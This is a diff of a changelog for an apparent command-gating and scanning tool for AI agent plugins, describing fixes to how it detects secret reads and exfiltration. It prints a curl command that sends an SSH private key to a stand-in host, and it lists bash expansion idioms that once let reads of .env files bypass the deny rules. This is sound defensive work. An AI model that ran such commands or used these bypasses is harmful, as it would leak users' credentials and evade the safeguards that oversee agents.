@@ -170,12 +170,43 @@ A third review round found eight more, including one regression from round two:
 - `allowed-tools` was only checked in `SKILL.md`, never in a plugin's `commands/*.md` or
   `agents/*.md`, which carry the same grant.
 
+A fourth review round, run on a different model, found two more criticals and a
+pre-existing denial of service:
+
+- *The approve floor was looser than the expansion engine.* `hasUnresolvedRead` scraped the
+  base name out of any `${...}` shape and called the read resolved if that name was tracked,
+  but `expandVars` only ever substitutes bare `$NAME` or exact `${NAME}`. So the deny pass
+  never saw the value while the floor cleared the read anyway: `X=.env; cat "${X:-nope}"`
+  returned **allow**. Same for `${X#pat}`, `${X%pat}`, `${X/a/b}`, `${X:0:9}`. These are
+  everyday bash idioms, not obfuscation. The floor now mirrors the expansion engine exactly,
+  and positional/special parameters (`$1`, `$@`, `$?`) count as opaque too.
+- *The static scanner had no signal for "read a secret, send it somewhere"* -- the exact
+  shape the runtime deny rules exist to stop. A script containing
+  `curl -d "$(cat ~/.ssh/id_rsa)" https://evil.test` scored clean in `shellter scan`, while
+  the identical payload inline in a `hooks.json` command was caught. A `secret-read-uploaded`
+  / `secret-piped-to-network` pack now covers both orderings plus the PowerShell form, and
+  reaches every caller of `scanShell`. Ordinary uploads (`curl -d @payload.json`,
+  `curl -F file=@dist/app.tar.gz`, anything reading a `.env.example`) stay clean.
+- *Dropping a file extension defeated the bundle scanner entirely.* Files were selected for
+  scanning by extension, so renaming `hook.sh` to `hook` meant no scan, no coverage gap, and
+  `--strict` still exiting 0. Files are now classified by content, not name. Shell rules
+  apply to actual scripts -- shell extension, a shell shebang, or no extension at all --
+  because running them over every `.md` and `.js` produced far more noise than signal
+  (a `curl | sh` line in install docs is not a payload). Note `#!/usr/bin/env node` is
+  correctly *not* a shell script; an earlier cut of this matched it and lit up every
+  bundled Node CLI on its own string literals.
+- *ReDoS in `var-composed-piped-to-shell`, present since before this branch.* The unbounded
+  `{2,}` was quadratic: a run of `${A` with no trailing pipe forced a full re-match at every
+  start position, so ~24KB stalled the hook 22 seconds, and `scanShell` reads script content
+  up to 256KB. Capped at `{2,12}` -- 8000 repetitions went from 22s to 62ms, linear, with
+  detection verified unchanged on short and 15-deep variable chains.
+
 **Also:** the shared codex/agy adapter test had four stale assertions expecting a ChatML role
 marker on an ordinary file to deny; 0.7.0 made that Class B (destination-gated), so the
 fixtures now target an agent-instruction file and a new assertion pins the gate itself.
 First CI: GitHub Actions on ubuntu (node 18/20/22) and windows (node 20).
 
-668 tests.
+690 tests.
 
 ## [0.7.1] - 2026-07-29
 
